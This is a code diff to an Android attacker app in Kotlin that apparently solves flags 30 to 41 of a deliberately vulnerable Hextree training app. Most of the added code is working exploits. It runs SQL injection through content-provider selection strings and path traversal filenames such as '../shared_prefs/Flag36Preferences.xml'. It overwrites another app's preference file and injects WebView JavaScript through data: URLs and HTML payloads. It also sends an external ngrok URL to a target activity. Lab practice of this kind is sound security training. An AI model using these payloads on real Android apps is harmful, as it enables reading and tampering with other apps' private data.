@@ -9,6 +9,7 @@ import android.content.IntentFilter
 import android.content.ServiceConnection
 import android.graphics.Bitmap
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.IBinder
@@ -113,7 +114,19 @@ enum class Action {
     Intent27,
     Intent28,
     Intent29,
-    Intent13
+    Intent13,
+    Intent30,
+    Intent31,
+    Intent32,
+    Intent33,
+    Intent34,
+    Intent35,
+    Intent36,
+    Intent37,
+    Intent38,
+    Intent39,
+    Intent40,
+    Intent41
 }
 
 @Composable
@@ -124,8 +137,15 @@ fun HandleIntentCam(onImageCaptured: (Bitmap) -> Unit) {
     ) { result : ActivityResult ->
         if (result.resultCode == Activity.RESULT_OK) {
             val data = result.data
-            //this only works on API level 33 and above
-            val bitmap = data?.getParcelableExtra("data",Bitmap::class.java)
+
+            val bitmap: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                //this only works on API level 33 and above
+                data?.getParcelableExtra("data", Bitmap::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                data?.getParcelableExtra("data") as? Bitmap
+            }
+
             if (bitmap != null) {
                 onImageCaptured(bitmap)
                 Utils.showDialog(context, result.data)
@@ -850,21 +870,7 @@ fun HandleIntent22(onIntentHandled: () -> Unit) {
         // Handle result if needed
         val intentDetails = Utils.dumpIntent(context, result.data)
         Log.d("IntentDump", intentDetails)
-        if (result.resultCode == Activity.RESULT_OK) {
-            val intent = result.data
-            if (intent != null) {
-                Log.d("IntentDump", intentDetails)
-
-                // Alternatively, show a dialog with the intent details
-                Utils.showDialog(context, intent)
-            } else {
-                Log.d("IntentDump", "Received intent is null")
-            }
-        } else {
-            Log.d("IntentDump", "Result code is not OK")
-        }
-
-        // Call the callback after handling the intent
+        Log.d("IntentDump", result.toString())
         onIntentHandled()
     }
 
@@ -1168,6 +1174,417 @@ fun HandleIntent29(onIntentHandled: () -> Unit) {
 }
 
 @Composable
+fun HandleIntent30(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+    val contentUri = Uri.parse("content://io.hextree.flag30/success")
+    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
+        if (cursor.moveToFirst()) {
+            val sb = StringBuilder()
+            do {
+                for (i in 0 until cursor.columnCount) {
+                    if (i > 0) sb.append(", ")
+                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
+                }
+                sb.append("\n")
+            } while (cursor.moveToNext())
+            Log.i("yeet",sb.toString())
+        }
+    }
+    onIntentHandled()
+}
+
+@Composable
+fun HandleIntent31(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+    val contentUri = Uri.parse("content://io.hextree.flag31/flag/31")
+    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
+        if (cursor.moveToFirst()) {
+            val sb = StringBuilder()
+            do {
+                for (i in 0 until cursor.columnCount) {
+                    if (i > 0) sb.append(", ")
+                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
+                }
+                sb.append("\n")
+            } while (cursor.moveToNext())
+            Log.i("yeet",sb.toString())
+        }
+    }
+    onIntentHandled()
+}
+
+@Composable
+fun HandleIntent32(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+    val contentUri = Uri.parse("content://io.hextree.flag32/flags")
+    val sqlquery = "1=1) UNION SELECT * from Flag WHERE visible=0 UNION SELECT *, null from Note --"
+    context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
+        if (cursor.moveToFirst()) {
+            val sb = StringBuilder()
+            do {
+                for (i in 0 until cursor.columnCount) {
+                    if (i > 0) sb.append(", ")
+                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
+                }
+                sb.append("\n")
+            } while (cursor.moveToNext())
+            Log.i("yeet",sb.toString())
+        }
+    }
+    onIntentHandled()
+}
+
+@Composable
+fun HandleIntent33(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        Log.d("IntentDump", "receiving")
+        val intentDetails = Utils.dumpIntent(context, result.data)
+        Log.d("IntentDump", intentDetails)
+        val output = result.data
+        val contentUri = output?.data
+        val sqlquery = "1=1 UNION SELECT *,null from Note --"
+
+        if (contentUri != null) {
+            context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    val sb = StringBuilder()
+                    do {
+                        for (i in 0 until cursor.columnCount) {
+                            if (i > 0) sb.append(", ")
+                            sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
+                        }
+                        sb.append("\n")
+                    } while (cursor.moveToNext())
+                    Log.i("IntentDump",sb.toString())
+                }
+            }
+        }
+
+        onIntentHandled()
+
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag33Activity1"
+            )
+            action = "io.hextree.FLAG33"
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+    }
+
+}
+
+@Composable
+fun HandleIntent34(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        Log.d("IntentDump", "receiving")
+        val intentDetails = Utils.dumpIntent(context, result.data)
+        Log.d("IntentDump", intentDetails)
+        val data = result.data?.data
+
+        val test = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""
+
+        Log.d("IntentDump", test)
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag34Activity"
+            )
+            putExtra("filename","flags/flag34.txt")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+    }
+
+
+}
+
+@Composable
+fun HandleIntent35(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        Log.d("IntentDump", "receiving")
+        val intentDetails = Utils.dumpIntent(context, result.data)
+        Log.d("IntentDump", intentDetails)
+        val data = result.data?.data
+
+        val test = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""
+
+        Log.d("IntentDump", test)
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag35Activity"
+            )
+
+            putExtra("filename","../flag35.txt")
+
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+    }
+
+
+}
+
+@Composable
+fun HandleIntent36(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+            val intentDetails = Utils.dumpIntent(context, result.data)
+            Log.d("IntentDump", intentDetails)
+            val data = result.data?.data
+
+
+            val content = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""
+
+            val modified = content.replace("false","true")
+
+            context.contentResolver.openOutputStream(data, "w")?.bufferedWriter()?.use { writer ->
+                writer.write(modified)
+            }
+
+            Log.d("IntentDump", modified)
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val inten3 = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag36Activity"
+            )
+
+        }
+        startForResult.launch(inten3)
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag35Activity"
+            )
+
+            putExtra("filename","../shared_prefs/Flag36Preferences.xml")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+@Composable
+fun HandleIntent37(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag37Activity"
+            )
+                data = Uri.parse("content://io.ks.intentatk.AtkIntent37Provider")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+@Composable
+fun HandleIntent38(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"
+            )
+            putExtra("URL", "data:text/html,<button onclick='document.write(hextree.success(true))'>success(true)</button>")
+            //putExtra("URL","https://oak.hackstree.io/android/webview/pwn.html")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+@Composable
+fun HandleIntent39(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"
+            )
+            //putExtra("NAME", "<a href='javascript:hextree.success()'>test</a>")
+            putExtra("NAME", "<button onclick='hextree.success()'>test</button>")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+@Composable
+fun HandleIntent40(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"
+            )
+            putExtra("URL", "content://io.ks.intentatk.AtkIntent40Provider/a.html")
+            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+        }
+        context.grantUriPermission("io.hextree.attacksurface", Uri.parse("content://io.ks.intentatk.AtkIntent40Provider/a.html") , Intent.FLAG_GRANT_READ_URI_PERMISSION)
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+@Composable
+fun HandleIntent41(onIntentHandled: () -> Unit) {
+
+    val context = LocalContext.current
+
+    val startForResult = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result: ActivityResult ->
+        if(result.data ==null){
+            Log.d("IntentDump", "nothing")
+        } else{
+            Log.d("IntentDump", "receiving")
+        }
+
+        onIntentHandled()
+    }
+
+    LaunchedEffect(Unit) {
+        val intent = Intent().apply {
+            setClassName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.activities.Flag41Activity"
+            )
+            putExtra("URL", "https://d585-115-135-30-252.ngrok-free.app")
+        }
+        startForResult.launch(intent)
+        Log.d("IntentDump", "Sending....")
+
+    }
+
+
+}
+
+
+@Composable
 fun Greeting(modifier: Modifier = Modifier) {
     val scrollState = rememberScrollState()
     // State to track the captured image
@@ -1200,18 +1617,19 @@ fun Greeting(modifier: Modifier = Modifier) {
         ) {
             Text(text = "Launch Camera")
         }
-        repeat(29){ i ->
-            if (i + 1 in 14..15) return@repeat
+        repeat(41) { i ->
+            if (i + 1 in 14..15 || i + 1 == 21) return@repeat
             Button(
                 modifier = Modifier,
                 onClick = {
-                    actionToPerform = Action.valueOf("Intent${i+1}")
+                    actionToPerform = Action.valueOf("Intent${i + 1}")
                 }
             ) {
-                Text(text = "Launch Intent${i+1}")
+                Text(text = "Launch Intent${i + 1}")
             }
         }
-        Spacer(modifier = Modifier.height(32.dp))
+
+        Spacer(modifier = Modifier.height(40.dp))
 
     }
 
@@ -1338,6 +1756,66 @@ fun Greeting(modifier: Modifier = Modifier) {
             }
         )
         Action.Intent29 -> HandleIntent29(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent30 -> HandleIntent30(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent31 -> HandleIntent31(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent32 -> HandleIntent32(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent33 -> HandleIntent33(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent34 -> HandleIntent34(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent35 -> HandleIntent35(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent36 -> HandleIntent36(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent37 -> HandleIntent37(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent38 -> HandleIntent38(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent39 -> HandleIntent39(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent40 -> HandleIntent40(
+            onIntentHandled = {
+                actionToPerform = null // Reset action after handling
+            }
+        )
+        Action.Intent41 -> HandleIntent41(
             onIntentHandled = {
                 actionToPerform = null // Reset action after handling
             }
